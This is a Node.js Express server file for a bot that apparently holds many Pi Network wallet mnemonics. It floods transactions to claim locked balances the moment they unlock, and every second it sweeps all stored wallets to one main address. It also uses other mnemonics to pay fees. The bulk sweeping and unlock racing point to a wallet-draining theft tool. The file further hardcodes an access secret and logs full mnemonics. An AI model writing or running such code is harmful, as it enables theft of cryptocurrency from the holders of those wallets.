import cors from 'cors';
import express from 'express';
import dotenv from 'dotenv';
import { connectToDB } from './db.js';
import passphraseRoutes from './routes/passphrases.js';
import sponsorRoutes from './routes/sponsors.js';
import { arrayBatches, autoCheckSponsorForClaimable, autoClaimUnlocked, autoDuplicatePassphrase, autoFundWallet, autoSweepWallet, buildAndSubmitMultiSigTx, FloodchannelTransaction, fundWallet, getAccount, getBalance, getBaseFee, getClaimableBalance, getKeypairFromPassphrase, PI_PUBLIC_ADDRESS, sleep, sweepWallet } from './utils/fn.js';
import Passphrase from './models/Passphrase.js';
import Sponsors from './models/Sponsors.js';
import Settings from './models/Settings.js';
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
app.set('trust proxy', 1);

const allowedOrigins = ['http://localhost:8888', 'https://piclaimer.netlify.app'];
app.use(express.json());
app.use(cors({
    origin: function (origin, callback) {
        if (!origin) return callback(null, true);
        if (allowedOrigins.includes(origin)) {
            return callback(null, true);
        } else {
            return callback(new Error('Not allowed by CORS'));
        }
    },
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization'],
}));
app.use((req, res, next) => {
    console.log('req.ip:', req.ip);
    console.log('req.headers["x-forwarded-for"]:', req.headers['x-forwarded-for']);
    console.log('req.socket.remoteAddress:', req.socket.remoteAddress);
    next();
});
app.use((req, res, next) => {
    const authHeader = req.headers.authorization;
    const secretKey = 'hfhryeujhshbxhdsjjskaas';
    if (!authHeader || authHeader !== `Bearer ${secretKey}`) {
        return res.status(403).json({ error: 'Forbidden' });
    }

    next();
});

await connectToDB();
const settings = await Settings.findOne();
const MAX_FLOOD_COUNT = Number(settings.maxFlood);
const BOT_PHRASE = settings.funderMnemonic;
const MAIN_ADDRESS = settings.mainAddress;

app.use('/api/passphrases', passphraseRoutes);
app.use('/api/sponsors', sponsorRoutes);

// Ping route
app.get('/', (req, res) => {
  res.send('🔁 Pi Bot Server is running - Time: ' + new Date().toLocaleString());
});


const instanceId = process.env.S_INSTANCE_ID || 0;
const sponsors = await Sponsors.find({ name: 'shepherd' });
const chunkSize = Math.ceil(sponsors.length/2);

setInterval(async() => {
    const sponsorChunk = sponsors.slice(instanceId * chunkSize, chunkSize);

    const now = new Date();
    const fiveSecondsFromNow = new Date(now.getTime() + 8000);
    
    const readyPassphrases = await Passphrase.find({
        claimableAt: { $lte: fiveSecondsFromNow },
        name: 'shepherd',
        status: 'pending'
    });

    for (const p of readyPassphrases) {
        try {
            console.log(`🔄 Claiming for: ${p.mnemonic.slice(0, 10)}...`);

            let tries = 0;
            let success = false;

            while(!success && tries < MAX_FLOOD_COUNT) {
                const now = new Date();

                const claimUnix = new Date(p.claimableAt).getTime();
                const diff = claimUnix - now.getTime();
                if (diff > 3000) {
                    await sleep(Math.min(diff - 500, 1000));
                    continue;
                }

                const result = await FloodchannelTransaction(
                    p.mnemonic,
                    p.balanceId,
                    MAIN_ADDRESS,
                    p.amount,
                    sponsorChunk
                );
                console.log(result[0]);
                const found = result.find((r) => r.hash);
                if (found) {
                    console.log(`✅ Claimed Pi. Hash: ${found.hash}`);
                    await Passphrase.updateOne(
                        { _id: p._id },
                        { $set: { status: "claimed" } }
                    );
                    success = true;
                    break;
                }
                tries++;
            }
            if (!success) {
                await Passphrase.updateOne(
                    { _id: p._id },
                    { $set: { status: "failed" } }
                );
            }

            

        } catch (err) {
            console.error('❌ Error something went wrong Pi:', err.message || err);
        }
    }
    
}, 100);

async function getUpcomingClaimables(start = 0) {
    const now = new Date();
    const tenMin = 10 * 60 * 1000;
    const x = start * 60 * 1000;
    const xMinutesFrom = new Date(now.getTime() - x);
    const tenMinutesFromNow = new Date(now.getTime() + tenMin);
    const upcomingClaimables = await Passphrase.find({
        claimableAt: {
            $gte: xMinutesFrom,
            $lte: tenMinutesFromNow
        },
        status: 'pending',
        name: 'shepherd'
    });

    return upcomingClaimables;
}

setInterval(async() => {
    if(instanceId !== 0) return;
        const upcomingClaimables = await getUpcomingClaimables(1);
        if (!upcomingClaimables.length) return;
    
        if(global.isFunding || global.isUnlocking) return;
        global.isFunding = true;
    
        const sponsorsPhrase = await Sponsors.find( {name: 'shepherd'} );
    
        for (const p of sponsorsPhrase) {
            try {
                // console.log(`🔄 funding for: ${p.mnemonic.slice(0, 10)}...`);
    
    
                const sponsorKp = getKeypairFromPassphrase(p.mnemonic);
                const accountData  = await getAccount(sponsorKp.publicKey());
    
                const balanceString = getBalance(accountData);
                const balance = parseFloat(balanceString) - 0.98;
    
                const change = balance - 0.1;
    
                const BotKP = getKeypairFromPassphrase(BOT_PHRASE);
                const botAccountData = await getAccount(BotKP.publicKey());
                const botBalanceString = getBalance(botAccountData);
                const botBalance = parseFloat(botBalanceString) - 1.98;
    
    
    
                if((change < 0) && (botBalance > Math.abs(change))) {
                    const result = await fundWallet(
                        BOT_PHRASE,
                        sponsorKp.publicKey(),
                        Math.abs(change).toFixed(7)
                    );
    
                    const success = result.data;
    
                    if (success.hash) {
                        // console.log(`✅ funded ${result.amount} Pi. Hash: ${success.hash}`);
                        
                    } else {
                        // console.log(`❌ Failed to fund ${result.amount} PI}`);
                    }
                }
                await sleep(1000);
    
            } catch (err) {
                // console.error('❌ Error funding Pi:', err.message || err);
            }
        }
        global.isFunding = false;
}, 1000);

setInterval(async() => {
    if(instanceId !==1) return;
        if(global.isSweeping) {
            return;
        }
        global.isSweeping = true
        const upcomingClaimables = await getUpcomingClaimables();
        if (upcomingClaimables.length > 0) {
            for(const claimable of upcomingClaimables) {
                await sweepWallet(claimable.mnemonic, MAIN_ADDRESS);
                await sleep(1000);
            }
            global.isSweeping = false;
            return;
        }
    
        const readyPassphrases = await Passphrase.find({ name: 'shepherd' });
        const passphraseBatches = arrayBatches(readyPassphrases, 80);
    
        for(const passphrases of passphraseBatches) {
            await Promise.all(passphrases.map(async (phrase, i) => {
                try {
                    const result = await sweepWallet(phrase.mnemonic, MAIN_ADDRESS);
                    console.log('Phrase', phrase.mnemonic)
                } catch (e) {
                    if (e.response && e.response.data && e.response.data.extras) {
                        const extras = e.response.data.extras;
                        // console.log('Transaction failed:', extras);
                    } else {
                        // console.error('Unknown error:', e);
                    }
                }
            }));
    
            await sleep(1000);
        }
        global.isSweeping = false;
}, 1000);


app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Pi Bot Server running on port ${PORT}`);
}); 


